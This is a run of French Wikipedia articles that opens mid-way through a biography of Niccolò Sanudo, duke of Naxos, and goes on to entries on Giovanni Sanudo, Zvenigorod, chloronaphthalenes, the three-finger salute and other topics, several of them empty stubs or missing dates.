Le règne du père de Niccolò, Guglielmo Sanudo fut marqué par l'arrivée de deux nouvelles menaces dans l'Égée : les Catalans, d'abord au service de l’empereur byzantin Andronic II contre les Turcs avant de se retourner contre l'Empire et de ravager la région ; et les Turcs eux-mêmes. Les petits seigneurs des Cyclades, vassaux du duché de Naxos, face à ce double danger, se tournèrent de plus en plus vers Venise plus à même de les protéger que leur suzerain. Guglielmo chercha un appui chez les Hospitaliers de Saint-Jean de Jérusalem qu'il aida à conquérir Rhodes et invita à construire une forteresse sur Délos. Un des frères de Niccolo rejoignit l'ordre.
Dans la même perspective d'alliances, Niccolò Sanudo épousa Jeanne de Brienne, liant le duché de Naxos avec le duché d'Athènes de Gautier de Brienne. Il participa en mars 1311 à la bataille d'Halmyros contre la Compagnie catalane et y fut fait prisonnier. Après s'être emparé d'Athènes, les Catalans ravagèrent les Cyclades. Relâché contre rançon, il fut nommé par son père Guglielmo commandant et chargé de lutter sur mer et sur terre contre les exactions catalanes.
Duc de Naxos.
Niccolò Sanudo succéda à son père Guglielmo Sanudo en 1323.
En janvier 1325, il fut appelé à l'ost par son suzerain, le prince d'Achaïe Jean de Gravina qui cherchait à reconquérir les territoires perdus par la principauté au profit de l'Empire byzantin. Il participa ainsi au siège de la forteresse de Karýtena, que les Francs ne parvinrent cependant pas à prendre. Jean de Gravina quitta la principauté au printemps 1326, laissant Niccolo Sanudo à la tête des troupes. Malgré son infériorité numérique il remporta ainsi une victoire sur l'armée grecque qui cherchait à pénétrer en Élide. Puis, il quitta lui aussi le Péloponnèse. Il fut le dernier duc de Naxos à commander une troupe sur le continent.
Pendant son absence, au début de 1325, les Turcs razzièrent Naxos après avoir attaqué l'Eubée, peut-être à l'instigation de leurs alliés catalans du duché d'Athènes, ennemis des Angevins.
Entre 1326 et 1327, Niccolo entra en conflit avec Bartolomeo Ghisi, pour une cause inconnue. Les deux adversaires s'attirèrent à ce sujet une condamnation de la part du baile vénitien de Négrepont, qui fut finalement annulée par le sénat vénitien.
En 1329, Andronic III Paléologue décida de chasser les Génois installés sur Chios depuis le règne de son père. Une flotte naxiote, commandée par Niccolo, participa à l'expédition. Ce renversement des alliances n'était pas inhabituel. De plus, les Génois étaient les ennemis directs des Vénitiens (avec qui le duché de Naxos avait malgré tout des liens privilégiés).
En 1332, il conclut une trêve séparée avec les Turcs sans y comprendre Négrepont, malgré l'interdiction formulée par les autorités vénitiennes de l'île ; ce dernier reçut cependant en avril l'ordre de ne pas prendre de mesures de représailles à son encontre. Au cours du printemps et de l'été, il fut associé (ainsi que Bartolomeo Ghisi) aux négociations entre Venise et ses colonies, l'empire byzantin et les Hospitaliers en vue de former la première ligue antiturque destinée à lutter contre les flottes des émirats côtiers. 
À la fin de 1334 ou début 1335, il participa avec 3 galères à une attaque sur Lesbos (alors byzantine) conjointement avec les Hospitaliers et le Génois Domenico Cattaneo, mais ce dernier évinça ses alliés de la ville qu'il occupa seul. 
Conflits féodaux.
Niccolò Sanudo avait hérité de son père de revendications sur les îles d'Amorgós et de Santorin, qui avaient été reconquises vers 1302 sur les Byzantins par des Vénitiens qui ne reconnaissaient pas la suzeraineté des ducs de Naxos. 
Concernant Amorgós, il avait hérité de la condamnation de son père par les autorités vénitiennes et se trouvait ainsi banni de Venise ; le procès contre la branche de la famille Ghisi qui revendiquait l'île se poursuivit tout au long de sa vie et il transmit le conflit à son successeur Giovanni.
Peu avant septembre 1325, le duc attaqua l'île de Santorin alors tenue par Andrea II Barozzi, qui fit appel à Venise ; cependant le sénat vénitien estima en octobre 1326 qu'il s'agissait d'une affaire féodale ne relevant pas de sa juridiction. L'affaire se poursuivit jusqu'à la conclusion d'une trêve en 1331. Le conflit reprit peu après la mort d'Andrea Barozzi en 1334 : l'année suivante, Niccolò débarqua à nouveau à Santorin et Thérasia où il captura les deux frères du fils et héritier d'Andrea, Marino ; malgré l'intervention judiciaire de Venise en faveur de ce dernier, Niccolò et ses héritiers restèrent définitivement en possession des deux îles.
Mort et succession.
Le dernier document qui mentionne Niccolo vivant est une demande adressée en au doge par Bartolomeo Ghisi en vue de l'achat d'une galère, que les deux seigneurs avaient prévu d'armer conjointement pour défendre Négrepont contre les attaques turques. Il mourut, sans héritier direct, avant le , date à laquelle son successeur Giovanni porte le titre de duc.

</doc>
<doc id="2844121" url="https://fr.wikipedia.org/wiki?curid=2844121" title="Embu (homonymie)">
Embu (homonymie)

Embu désigne à la fois :

</doc>
<doc id="2844125" url="https://fr.wikipedia.org/wiki?curid=2844125" title="Giovanni Sanudo">
Giovanni Sanudo

Giovanni Sanudo, sixième duc de Naxos (décédé en 1362).
Famille et jeunesse.
La famille Sanudo aurait fourni divers doges à la Sérénissime. Un Marco Sanudo est attesté dans la seconde moitié du . Il aurait exercé diverses fonctions pour la république de Venise dont ambassadeur à Constantinople d'où son surnom de "Costantinopolitani" (le « Constantinopolitain »). Son fils Pietro épousa Zabarella, une sœur du doge Enrico Dandolo. De ce mariage seraient nés trois fils dont Marco Sanudo, le fondateur de la dynastie. Il participa à la quatrième croisade en 1204 puis fonda le duché de Naxos. Il fit construire une nouvelle capitale autour de sa forteresse, le "castro" sur l'île de Naxos. Il lutta aux côtés de Venise et de son suzerain l'empereur latin. Angelo Sanudo, son fils, passa la plus grande partie de sa vie à guerroyer, principalement pour ses suzerains l'empereur latin puis après 1248 le prince d'Achaïe. Le règne du grand-père de Giovanni, Marco II Sanudo, fut perturbé. Le duché de Naxos ne cessa de rétrécir sous les coups de l'Empire byzantin.
Le règne du père de Giovanni, Guglielmo Sanudo fut marqué par l'arrivée de deux nouvelles menaces dans l'Égée : les Catalans, d'abord au service de l’empereur byzantin Andronic II contre les Turcs Seldjoukides avant de se retourner contre l'Empire et de ravager la région ; et les Seldjoukides eux-mêmes. Les petits seigneurs des Cyclades, vassaux du duché de Naxos, face à ce double danger, se tournèrent de plus en plus vers Venise plus à même de les protéger que leur suzerain. Guglielmo chercha un appui chez les Hospitaliers de Saint-Jean de Jérusalem qu'il aida à conquérir Rhodes et invita à construire une forteresse sur Délos. Un des frères de Giovanni rejoignit l'ordre.
Dans la même perspective d'alliances, le frère aîné de Giovanni, Niccolò Sanudo avait épousé une jeune femme de la famille de Brienne, liant le duché de Naxos avec le duché d'Athènes de Gautier de Brienne.
Duc de Naxos.
Il succéda à son frère Niccolò Sanudo en 1341.
Au moment où Giovanni monta sur le trône, l'Empire byzantin était secoué par une guerre civile opposant les partisans de Jean VI Cantacuzène et de Jean V Paléologue. Umur Bey, l'émir d'Aydın s'était allié à Jean Cantacuzène et Giovanni à Jean Paléologue. Les deux alliés s'affrontèrent. En 1344, Umur Bey mena un raid contre Naxos. Il aurait fait victimes (morts et esclaves capturés) et les oliviers et le port auraient été brûlés.
En 1350, la guerre entre la république de Venise et la république de Gênes reprit, car Gênes s'était emparé du monopole du commerce en mer Noire. Venise s'allia avec l'Aragon, l'Empire byzantin et le duché de Naxos. Giovanni participa directement aux combats : lors du siège de Galata et du siège de Caffa, le port génois en Crimée ; il manqua de mourir d'une fièvre lors d'une expédition et reçut une flèche lors d'un combat naval. En 1351, des galères génoises attaquèrent Naxos et s'emparèrent de Giovanni Sanudo, de toute sa famille et de ses biens. Il fut retenu prisonnier à Gênes pendant trois ans, jusqu'à la signature du traité de paix entre les deux cités marchandes. Venise et le pape Clément VI s'assurèrent que ses biens soient préservés et lui soient rendus à sa libération (la lettre de Clément VI demandant aux Génois sa libération et la restitution de ses possessions, datée du , mentionne qu'il s'est comporté en « champion » de la lutte contre les Turcs). Dans un document daté cependant du , Giovanni concède provisoirement l'île de Milos aux fils du doge Andrea Dandolo en attendant le remboursement d'un emprunt de 805 ducats d'or contracté auprès de ces derniers.
Comme il n'avait pas d'héritier mâle, sa fille Fiorenza Sanudo et son époux lui succédèrent en 1362.

</doc>
<doc id="2844127" url="https://fr.wikipedia.org/wiki?curid=2844127" title="Embu (ville)">
Embu (ville)



</doc>
<doc id="2844133" url="https://fr.wikipedia.org/wiki?curid=2844133" title="Skholè">
Skholè

Skholè ou scholè (en ), veut dire « temps libre », « loisir », mais c’est aussi la racine du mot « école », en latin "schola". La notion d’enseignement ou leçon, aussi bien que celle qui fait référence à l’institution scolaire, ont comme origine l’idée de temps libre, de diversion, de repos propres au travail intellectuel. C’est pour cela que Pierre Bourdieu, dans son livre "Méditations pascaliennes", a donné au mot "skholè" un sens technique emprunté au mode de vie et à la pensée des Grecs : (). Les hommes de la sont ceux qui, en Grèce, sont nés libres et font leur travail politique, littéraire ou législatif, librement, c’est-à-dire à loisir, comme le rappelle Platon ; ce sont essentiellement les philosophes. Ils s’opposaient aux hommes de l’ / , la nécessité qui contraignait les orateurs des tribunaux ; faute de temps, ceux-ci ne pouvaient se dégager des nécessités et de la hâte de la pratique routinière, vu que demain serait trop tard. 
D'après Bourdieu, la "skholè" est condition de l'existence de tous les champs savants. Elle est « la plus déterminante de toutes les conditions sociales de possibilité de la pensée « pure », et aussi la disposition scolastique qui incline à mettre en suspens les exigences de la situation, les contraintes de la nécessité économique et sociale, et les urgences qu'elle impose ou les fins qu'elle propose » (idem. ). 

</doc>
<doc id="2844135" url="https://fr.wikipedia.org/wiki?curid=2844135" title="Groupe Steria">
Groupe Steria



</doc>
<doc id="2844136" url="https://fr.wikipedia.org/wiki?curid=2844136" title="Hyères (rivière)">
Hyères (rivière)



</doc>
<doc id="2844139" url="https://fr.wikipedia.org/wiki?curid=2844139" title="Yan Zoritchak">
Yan Zoritchak

Yan Zoritchak ( Ján Zoričák), né le à Ždiar, village des Hautes Tatras (Slovaquie), est un verrier et sculpteur d'origine slovaque. Il est installé depuis 1970 en France, à Talloires.
Biographie.
Ján Zoričák effectue sa scolarité dans une école d'arts décoratifs de Bratislava puis à l'école technique et artistique du verre (Střední uměleckoprůmyslová škola sklářská) de Železný Brod (1959-1963) complétée par des études supérieures à l’École supérieure des arts appliqués de Prague (1963-1969) où il est l'élève de . En 1968, il est l'auteur d'une pièce de 50 couronnes tchécoslovaques fondue à l'occasion du de la république socialiste tchécoslovaque.
Il est ensuite spécialisé dans la taille du cristal de Bohême.
Il dirige le premier centre de formation consacré à l'art du verre à Aix-en-Provence.
C'est lui qui sculpte les récompenses du Festival d'animation d'Annecy.
Il fut membre du jury au Festival international du film fantastique d'Avoriaz 1993.
Il a été marié à Catherine Montouchet-Zoritchak, également sculptrice de verre.

</doc>
<doc id="2844145" url="https://fr.wikipedia.org/wiki?curid=2844145" title="Speed Rabbit Pizza">
Speed Rabbit Pizza

Speed Rabbit Pizza est une société anonyme française créée en 1991, dont l'activité est la restauration rapide et la livraison de pizzas à domicile. Son siège est situé à Lille (Nord).
Histoire.
Speed Rabbit Pizza est née en pleine période très influencée par les tendances et modes venues des États-Unis, dont celle de la consommation de pizzas. 
C’est naturellement que la marque Speed Rabbit Pizza s’inspire alors des années rock 'n' roll et des fameux Cabs new-yorkais : le damier noir et blanc, la couleur jaune dominante et bien sûr le taxi emblématique. Le logo et la marque reprennent le lapin, symbole de la vitesse.
Le concept s’est ainsi fondé sur la livraison rapide et à domicile de pizzas dites « pan pizzas » : la pâte est disposée dans un moule pour y être copieusement garnie puis cuite dans un four convoyeur. À l’époque, Speed Rabbit Pizza introduit un principe inédit en France : proposer en vente à emporter une pizza offerte pour une pizza achetée 7 jours sur 7.
Modèle économique.
Le modèle de développement du réseau est la franchise. En , Speed Rabbit Pizza annonçait 95 points de vente. En , « 130 à 135 ».
En , Speed Rabbit Pizza ne listait plus que 7 points de vente sur son site internet.

</doc>
<doc id="2844153" url="https://fr.wikipedia.org/wiki?curid=2844153" title="Chloronaphtalène">
Chloronaphtalène

Les chloronaphtalènes (PCN pour polychlorinated naphthalene) sont des produits fabriqués par réaction chimique entre le chlore et le naphtalène, se présentant sous l’aspect d’un solide d’odeur douceâtre et âcre qui est fabriqué à partir du charbon ou du pétrole, et souvent utilisé pour le traitement pesticide antimite, en remplacement du paradichlorobenzène que l’AFSSA (saisie le ) avait recommandé d’interdire dans les antimites avant 2007, et dans les désodorisants utilisés dans les toilettes.
La formule brute générique est .
Utilisations.
Les chloronaphtalènes commerciaux sont des mélanges de 75 isomères auxquels il faut ajouter les sous-produits. Ils sont souvent caractérisés par leur fraction en chlore total. Lorsque la proportion de chlore augmente, les PCN deviennent de plus en plus pâteux voire solides à température ambiante. Certains chloronaphtalènes ont été utilisés comme revêtements isolants pour câbles électriques. D'autres ont été employés pour le traitement du bois, comme additifs pour le caoutchouc et les plastiques, comme diélectriques pour les condensateurs et comme lubrifiants.
Production.
On a commencé à produire les chloronaphtalènes en grandes quantités aux environs de 1910 à la fois en Europe et aux États-Unis. En Europe, les produits fabriqués en plus grandes quantités sont les cires Nibren, fabriquées en Allemagne par Bayer. Les autres noms commerciaux pour les chloronaphtalènes en Europe sont Seekay (fabriqué au Royaume-Uni, par ICI), Clonacire (France), Cerifal (Italie) et Woskol (Pologne). Aux États-Unis, la majeure partie de la production de chloronaphtalène a été commercialisée sous le nom d’Halowax, par la compagnie du même nom de New York qui a été plus tard rachetée par Union Carbide, puis reprise par Koppers de Pittsburgh et maintenant située à Beazer East. Bien que des quantités infimes de chloronaphtalènes puissent être libérées au cours de processus naturels tels que les incendies de forêt, les utilisations industrielles de ces produits sont probablement responsables d’une augmentation des taux d'accumulation dans l'environnement multipliés par des facteurs dix mille ou davantage.
Effets sur la santé.
Après environ vingt ans de production commerciale, les risques pour la santé ont commencé à être rapportés chez les travailleurs exposés aux chloronaphtalènes : éruptions cutanées sévères et atteintes hépatiques qui ont conduit à des décès parmi les travailleurs.Une conférence sur les dangers a été organisée à la en 1937, et plusieurs autres publications traitant des dangers des chloronaphtalènes ont été faites avant 1940. Les choronaphtalènes contenant trois atomes de chlore ou davantage par molécule ont habituellement été considérés comme plus dangereuses que les molécules moins chlorées, mais lorsqu’on approche du nombre maximum de huit atomes, les risques semblent diminuer.
Il y a eu environ quarante ans de décalage, entre la divulgation des risques des chloronaphtalènes et la mise en œuvre d’une réglementation gouvernementale. Aux États-Unis, l'exposition aux chloronaphtalènes a été drastiquement réduite après 1976, à la suite de la promulgation du Toxic Substances Control Act. Les grands fabricants d'équipements ont interdit l’utilisation des chloronaphtalènes dans leurs produits, et les principaux producteurs ont abandonné leur activité. En 1983, la production mondiale de chloronaphtalènes était presque arrêtée à l'exception de petites quantités utilisées pour l'expérimentation et la recherche. Jusqu'à ces dernières années, Du Pont de Nemours produisait un caoutchouc synthétique, le Néoprène FB, fabriqué en Irlande du Nord à partir de pentachloronaphtalène. Aujourd'hui, les chloronaphtalènes sont commercialisés par quelques entreprises seulement, dont Ukrgeochem de Simferopol, en Ukraine.
Tandis que certains cloronaphtalènes peuvent être décomposés par la lumière du Soleil et, à un rythme très lent, par certains micro-organismes, de nombreux chloronaphtalènes persistent dans l'environnement. Après plus de quatre-vingts années d'utilisation et une production totale de plusieurs centaines de millions de kilogrammes, les résidus des chloronaphtalènes ont été largement disséminés. Une exposition aiguë provoque la chloracné. L'exposition chronique augmente le risque de maladie du foie. Une augmentation des risques de survenue d’un cancer a été suspectée, mais à ce jour non encore démontrée. Les préoccupations actuelles à propos des chloronaphtalènes concernent notamment leur libération comme sous-produits d'incinération des déchets.

</doc>
<doc id="2844157" url="https://fr.wikipedia.org/wiki?curid=2844157" title="Agent psychoactif">
Agent psychoactif



</doc>
<doc id="2844163" url="https://fr.wikipedia.org/wiki?curid=2844163" title="Libertés économiques">
Libertés économiques



</doc>
<doc id="2844169" url="https://fr.wikipedia.org/wiki?curid=2844169" title="Saint-Laurent (fromage)">
Saint-Laurent (fromage)



</doc>
<doc id="2844186" url="https://fr.wikipedia.org/wiki?curid=2844186" title="Grand Prix de Plouay féminin">
Grand Prix de Plouay féminin

Le Grand Prix de Plouay féminin, appelé de différentes manières selon les éditions pour des raisons de partenariat et notamment avec Lorient Agglomération, est une course cycliste féminine française.
Créée en 1999, l'épreuve, qui se tient tous les ans à Plouay en France, est l'une des épreuves de la Coupe du monde de cyclisme sur route féminine de 2002 jusqu'en 2015, puis de l'UCI World Tour féminin depuis 2016. Elle se déroule à la fin du mois d'août, à la veille de la Bretagne Classic (anciennement "GP de Plouay") exception faite en 2021, où elle est courue le lendemain, un lundi.
Originellement disputé en circuit comme son homologue masculin, le Grand-Prix devient un parcours en ligne en 2021 et serpente à travers le territoire de Lorient Agglomération avant de revenir sur le circuit traditionnel.
Statistiques.
Vainqueurs multiples.
Quatre coureuses ont remporté l'épreuve au moins deux fois.
Grand Prix de Plouay féminin juniors.
Une course féminine pour les coureuses juniors (moins de 19 ans) est organisée depuis 2022. Elle fait partie du calendrier UCI en catégorie 1.1WJ.

</doc>
<doc id="2844188" url="https://fr.wikipedia.org/wiki?curid=2844188" title="Jason Hobson">
Jason Hobson

Jason Hobson, né le à Swansea (Pays de Galles), est un joueur international anglais de rugby à XV jouant au poste de pilier droit.

</doc>
<doc id="2844189" url="https://fr.wikipedia.org/wiki?curid=2844189" title="Madame de Staël">
Madame de Staël



</doc>
<doc id="2844193" url="https://fr.wikipedia.org/wiki?curid=2844193" title="Wild Arms XF">
Wild Arms XF

 est un jeu vidéo de type "tactical RPG" sur PlayStation Portable. Il fait partie de la série des "Wild Arms".

</doc>
<doc id="2844200" url="https://fr.wikipedia.org/wiki?curid=2844200" title="Evangile du verseau">
Evangile du verseau



</doc>
<doc id="2844203" url="https://fr.wikipedia.org/wiki?curid=2844203" title="Kolmoskanava">
Kolmoskanava

Kolmoskanava ("Troisième Canal" en finnois, ou également TV3) est une chaîne de télévision généraliste nationale semi-publique finlandaise diffusée du au . Elle est née d'une coentreprise entre le service public de radio-télévision finlandais, la Yleisradio, la chaîne de télévision commerciale MTV, et l'entreprise de télécommunications Nokia. En 1990, MTV devient le seul actionnaire de la chaîne en rachètant les parts de la Yleisradio et de Nokia. Le , la chaîne a été fermée et sa chaîne sœur MTV a été rebaptisée MTV3.
Histoire.
Le Kolmoskanava commence à émettre le , depuis l'émetteur d'Espoo, dans le sud de la Finlande. Au cours de ses neuf premiers d'existence, elle diffusée un film tous les soirs, certains sports comme le hockey de la LNH et quelques autres programmes. Initialement, elle devait être une chaîne de divertissement.
Elle fut la première chaîne de télévision finlandaise à diffuser des publicités régionales. Elle a également été la première chaîne à ne pas produire ses programmes elle-même.
Durant la période 1987-1988, la zone de diffusion de la chaîne est élargie, et inclut dorénavant la région de Tampere, de Lahti et le Sud-Ouest de la Finlande.

</doc>
<doc id="2844206" url="https://fr.wikipedia.org/wiki?curid=2844206" title="Naivasha">
Naivasha

Naivasha est une ville de l'ancienne province de la vallée du Rift et le chef-lieu du district de Naivasha dans le comté de Nakuru au Kenya. Elle est située sur la rive est du lac Naivasha, à d'altitude à quelques dizaines de kilomètres au sud de l'équateur et au nord-ouest de Nairobi, sur l'autoroute qui la relie à Nakuru et sur la voie ferrée "Uganda Railway".
L'activité principale est l'agriculture, principalement la floriculture, mais elle est aussi une destination touristique importante avec plusieurs parcs nationaux à proximité et une faune sauvage importante.
Des accords de paix se sont tenus dans la ville pour mettre fin à la Seconde Guerre civile soudanaise, connus sous le nom d'accord de Naivasha.

</doc>
<doc id="2844210" url="https://fr.wikipedia.org/wiki?curid=2844210" title="Hyères (Côte-d'Armor)">
Hyères (Côte-d'Armor)



</doc>
<doc id="2844212" url="https://fr.wikipedia.org/wiki?curid=2844212" title="Zvenigorod">
Zvenigorod

Zvenigorod (en ) est une ville de l'oblast de Moscou, en Russie. Sa population s'élevait à en 2014 et à 37 271 habitants en 2024.
Géographie.
Zvenigorod est bâtie sur la rive gauche de la Moskova et se trouve à à l'ouest du centre de Moscou.
Histoire.
Zvenigorod existe depuis le , bien que sa première mention écrite ne date que de 1338. Le nom de la ville est dérivé de deux racines : « sonner les cloches » et « ville ». Il peut se traduire par « la ville où sonneront les cloches ». En effet, quand sonnaient les cloches de Zvenigorod, le bruit parvenait jusqu'à Moscou, à quelque à l'est.
Zvenigorod commença à être connu à la fin du , après avoir été léguée par Dimitri Donskoï à son deuxième fils Iouri, qui fonda sa résidence sur la rive escarpée de la rivière Moskova. Le kremlin local, appelé Gorodok, contient le seul exemplaire entièrement préservé d'architecture moscovite du , la Cathédrale de la Dormition sur Gorodok(1399-1400(?)). L'intérieur de la cathédrale est décoré de fresques du fameux peintre Andreï Roublev.
Zvenigorod a été marqué par le souvenir des guerres intestines menées par les fils de Iouri pour le contrôle de Moscou, sous le règne de leur cousin Vassili II (1425-1462). Après que leur parti fut défait, la ville fut incorporée dans la Moscovie. Zvenigorod a obtenu le statut de ville en 1784. À la fin du , la ville devint, chez les intellectuels, un lieu à la mode de la banlieue de Moscou. Beaucoup de datchas extravagantes y furent construites. Certaines sont devenues des musées, comme les maisons de Sergueï Taneïev, Anton Tchekhov et Isaac Levitan.
"Zvenigorod" est le nom d'un poème d'Agnia Barto, qui lui a été inspiré par son expérience dans l'orphelinat de cette ville après la Seconde Guerre mondiale. Il déboucha sur une émission de radio ("Найти человека" « Personne recherchée », sur Radio Maïak) qui permit de réunir près de mille familles séparées par la guerre et valut à Barto un véritable culte en Union soviétique.
Population.
Recensements (*) ou estimations de la population
Patrimoine.
En 1398, le prince Iouri demanda à saint Savva Storojevski, l'un des premiers disciples de Serge de Radonège, d'aller à Zvenigorod et d'y établir un monastère sur la colline Storoji Holm qui devint le Monastère Saint-Sabbas de Storoji. Saint Savva Storojevski est enterré dans la cathédrale de la Vierge de la Nativité en 1407. Les fresques de l'autel remontent aux années 1420, mais le reste de l'intérieur a été peint en 1656. La magnifique Déisis de la Dormition de Zvenigorod à cinq rangées et les portes du paradis dues à l'école Stroganoff ont été installées en 1652.
En 1650, le tsar Alexis choisit le monastère comme sa résidence dans les environs de Moscou. En cinq ans, fut construit un palais royal en pierre blanche. Le cloître fut entouré de murs de pierre et de tours, copiés sur ceux de la laure de la Trinité-Saint-Serge. Particulièrement remarquable est un grand clocher, érigé en 1650.
Après la mort de Fédor III, qui y passa la majeure partie de son temps, le monastère déclina. En mai 1918, lorsque les bolcheviks essayèrent de s'emparer des reliques de saint Savva, plusieurs personnes furent abattues. En 1985, le cloître fut affecté au monastère de Danilov à Moscou. Les reliques de saint Savva furent rendues au monastère en 1998.
Sport.
Le club de handball féminin du Zvezda Zvenigorod est l'un des principaux clubs russes des années 2000, remportant notamment le Championnat de Russie en 2007 et la Ligue des champions en 2008.

</doc>
<doc id="2844221" url="https://fr.wikipedia.org/wiki?curid=2844221" title="Aaron Hadlow">
Aaron Hadlow

Aaron Hadlow, né le en Angleterre, est un kitesurfer professionnel britannique de renommée internationale.
Carrière.
Au cours de sa carrière, il a atteint des sommets en remportant cinq fois le championnat du monde de la "Professional Kiteboard Riders Association" (PKRA) et en étant également couronné deux fois au "Red Bull King of the Air" (KOTA) .
Sponsors.
Initialement soutenu par "Flexifoil" de 2001 à 2014, Aaron Hadlow a amorcé sa carrière sous cette enseigne. Par la suite, il a fait le choix de quitter Flexifoil pour rejoindre Duotone, anciennement connu sous le nom de « North Kiteboarding » et avec qui il entretient toujours un partenariat de sponsoring.
Il est également sponsorisé par Red Bull, Chiemsee et Pro-limit.

</doc>
<doc id="2844230" url="https://fr.wikipedia.org/wiki?curid=2844230" title="Centre Énergie Matériaux Télécommunications de l'NRS">
Centre Énergie Matériaux Télécommunications de l'NRS

Le Centre Énergie Matériaux Télécommunications de l'INRS est un des quatre centres de recherche et de formation aux études supérieures de l'Institut national de la recherche scientifique (INRS). Le centre contribue aux efforts québécois de recherche, de formation et de transfert technologique dans les domaines de l'énergie, des matériaux et des télécommunications. Il est à l’avant-garde des priorités scientifiques et technologiques du Québec. 
Les objectifs premiers du Centre Énergie Matériaux Télécommunications sont de développer la recherche, favoriser l'innovation et former une relève scientifique de haut calibre au niveau du et dans des secteurs stratégiques pour l'économie du Québec, à savoir les matériaux de pointe, les nanotechnologies, la photonique, les télécommunications et l’énergie.
Le Centre entend relever les défis qui se présentent au monde universitaire en misant sur les compétences qu’il a développées et en faisant preuve d’innovation dans le développement d’une science intersectorielle, dans le renouvellement et la croissance de son infrastructure, dans l’internationalisation de ses activités de recherche et de formation et dans la valorisation des résultats de la recherche. Le Centre Énergie Matériaux Télécommunications de l'INRS un centre de recherche et de formation à l’avant-garde des priorités scientifiques et technologiques du Québec.
L'Institut national de la recherche scientifique (INRS) est un établissement universitaire québécois voué à la recherche, aux études de cycles supérieurs et à la formation de chercheurs. Il a aussi pour mandat le développement de la recherche fondamentale et appliquée dans des secteurs jugés prioritaires pour le Québec, et ce, tout en s'assurant le transfert des connaissances et des technologies dans l'ensemble des secteurs où il œuvre.

</doc>
<doc id="2844231" url="https://fr.wikipedia.org/wiki?curid=2844231" title="Kitui">
Kitui

Kitui est une ville de la province orientale du Kenya, à 130 kilomètres à l'est de Nairobi. L'ethnie principale est formée par les Kambas.
Religion.
Kitui est le siège d'un évêché catholique.

</doc>
<doc id="2844233" url="https://fr.wikipedia.org/wiki?curid=2844233" title="Henri Paillard">
Henri Paillard

Pierre Henri Paillard, né le à Paris où il est mort le , est un peintre, graveur et illustrateur français.
Biographie.
Henri Paillard apprend la gravure sur bois chez un ancien élève de Henri-Désiré Porret, puis chez Joseph Burn Smeeton. Par la suite, il exécute des eaux-fortes. 
Il collabore dans des revues comme le "Magasin pittoresque", "Le Monde illustré", "la Gazette des Beaux-Arts", "L'Illustration", "L'Image", et pour la "Société des amis des livres". Il travaille aussi pour le bibliophile et éditeur Henri Beraldi, qu'il accompagne à plusieurs reprises dans les Pyrénées. Il grave les illustrations de Charles Jouas pour les "Cent ans aux Pyrénées" d'Henri Beraldi, mais les sept volumes paraissent finalement sans illustrations.
Il expose au Salon de Paris à partir de 1870.
Ami d'Auguste Lepère, avec lequel ils créent un atelier à Montmartre, il s'oriente, comme lui, de plus en plus vers la gravure originale. En 1911, il est membre fondateur et premier vice-président de la Société de la gravure sur bois originale.
En tant que peintre, il réalise des pastels, des aquarelles et des peintures à l'huile. Son œuvre se nourrit des paysages parisiens et de ses voyages en France, en Provence, en Bretagne, ou à l'étranger, en Belgique, Pays-Bas, Algérie dont il peint des paysages urbains ou des marines.
Henri Paillard meurt le et est inhumé dans la tombe d'Émile Goudeau, par les soins de Henri Beraldi.

</doc>
<doc id="2844234" url="https://fr.wikipedia.org/wiki?curid=2844234" title="Salut à trois doigts">
Salut à trois doigts

Le salut à trois doigts est réalisé avec le pouce, l'index et le majeur tendus et les autres doigts pliés. C'est un geste dont l'usage et la symbolique peuvent varier en fonction des usages héraldique, religieux, protocolaire ou politique, mais qui a en général un rapport historique avec la Trinité chrétienne et le signe de bénédiction liturgique.
D'autres signes avec trois doigts levés différents existent. Avec index, majeur et annulaire: le salut scout, utilisé dans la série "Hunger Games" puis devenu le salut à trois doigts (pro-démocratie) en Asie ; avec majeur, annulaire et auriculaire : geste du OK.
Prestation de serment.
Suisse.
En Suisse, il est coutumier de lever la main droite avec trois doigts levés (pouce, index, majeur) lors de la prestation de serment. Ce signe, appelé en allemand "Schwurhand", est une invocation à la Trinité et rappelle que le serment est pris avec Dieu comme témoin. Ce geste rappelle aussi, dans un symbolique laïque, la prestation de serment du Grütli qui est souvent représentée par trois hommes faisant ce signe pour marquer l'alliance des trois premiers cantons de Suisse centrale - fondateurs de la Confédération des III cantons - contre leur ennemi commun, la maison des Habsbourg. 
Pays-Bas.
Durant l'investiture des rois des Pays-Bas, le nouveau souverain prête serment avec le salut à trois doigts, appelé "Spreekgebaar" en hollandais. Ils déclarent alors , ce qui signifie 
Vatican.
Un autre exemple de l'utilisation de ce signe est la prestation de serment des nouvelles recrues de la garde suisse pontificale qui se déroule chaque année, le , dans la cour Saint-Damase au palais du Vatican devant un représentant du pape. Ceux-ci prêtent serment en faisant le salut à trois doigts de la main droite et en empoignant l'étendard de la garde de la main gauche.
Signe de ralliement national.
Italie.
Le salut à trois doigts est utilisé par les nationalistes et les séparatistes siciliens. Il représente le Trinacria présent sur le drapeau de la Sicile. Il a particulièrement été utilisé durant le mouvement pour l'indépendance de la Sicile.
Serbie.
Il existe plusieurs hypothèses quant à l'origine de ce geste, la plus répandue étant que les Serbes, en majorité chrétiens orthodoxes, utilisent ces trois doigts pour se signer en référence à la Trinité chrétienne, il est utilisé depuis la conversion des Serbes au christianisme au début du Moyen Âge. Il était un salut qui montrait que l'on était chrétien et non bogomile. Pendant la Seconde Guerre mondiale, le salut aurait été utilisé en signe de résistance aux Oustachis soutenus par les nazis.
Certains partis politiques ont tenté de récupérer ce symbole national, comme le Mouvement politique royaliste serbe, le symbolisme chrétien a alors été remplacé par : « le premier doigt pour saint Sava, le second pour Njegoš et le troisième pour Karađorđe », sans grand succès. Plus tard, les Tchetniks ont aussi utilisé ce salut lors de la guerre de Yougoslavie.
Lors de la cérémonie d'ouverture de Jeux olympiques d'été de 2008, le ministre des Affaires étrangères serbe du Parti démocratique (Serbie), Vuk Jeremić salua la délégation serbe avec un salut à trois doigts. En , après un match au Portugal validant la qualification de la sélection nationale serbe pour le Mondial 2022 au Qatar, plusieurs joueurs célèbrent la victoire en effectuant ce geste, dont Dušan Vlahović et Stefan Mitrović. Si ce salut en Serbie n'est pas strictement lié au nationalisme serbe, son usage reste controversé. Comme la politologue Anamaria Dutceac Segesten le remarque, l'importance du salut reste diverse : bien qu'il ait été utilisé par les nationalistes, il n'est pas pour autant monopolisé en tant que tel, car il existait déjà avant l'apparition du nationalisme.
Salut politique.
Salut de Kühnen.
Le salut de Kühnen, ou " en allemand, est une alternative au salut nazi souvent utilisée par les militants nationalistes ou néo-nazis afin de contourner les législations interdisant le salut nazi. Ce salut est illégal en Allemagne.
Ku Klux Klan.
Depuis 1915 le Ku Klux Klan, organisation suprémaciste blanche, utilise le geste des en références au trois K du mouvement.

</doc>
